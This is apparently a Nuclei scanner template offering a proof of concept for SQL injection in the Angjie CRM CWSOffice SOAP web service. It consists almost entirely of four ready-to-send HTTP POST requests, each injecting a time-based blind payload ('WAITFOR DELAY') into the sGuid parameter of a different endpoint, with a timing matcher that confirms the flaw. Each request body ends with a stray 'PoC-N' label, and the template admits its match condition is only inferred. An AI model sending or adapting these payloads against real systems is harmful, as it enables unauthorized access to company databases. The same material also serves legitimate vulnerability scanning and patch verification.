id: poc-qiio8s8v46m2v8h2
info:
  name: 昂捷CRM CWSOffice 存在多处SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - "POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetDocTemplateByGuid\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetDocTemplateByGuid xmlns=\"http://tempuri.org/\">\n      <sGuid>1';WAITFOR DELAY '0:0:5'--</sGuid>\n    </GetDocTemplateByGuid>\n  </soap:Body>\n</soap:Envelope>\n\nPoC-2"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
- raw:
  - "POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetDocTemplateList\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetDocTemplateList xmlns=\"http://tempuri.org/\">\n      <sGuid>1';WAITFOR DELAY '0:0:5'--</sGuid>\n      <sType>string</sType>\n    </GetDocTemplateList>\n  </soap:Body>\n</soap:Envelope>\n\nPoC-3"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
- raw:
  - "POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetDocumentByGuid\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetDocumentByGuid xmlns=\"http://tempuri.org/\">\n      <sGuid>1';WAITFOR DELAY '0:0:5'--</sGuid>\n    </GetDocumentByGuid>\n  </soap:Body>\n</soap:Envelope>\n\nPoC-4"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
- raw:
  - "POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetDocumentContent\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetDocumentContent xmlns=\"http://tempuri.org/\">\n      <sGuid>1';WAITFOR DELAY '0:0:5'--</sGuid>\n    </GetDocumentContent>\n  </soap:Body>\n</soap:Envelope>\n\nPoC-5"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
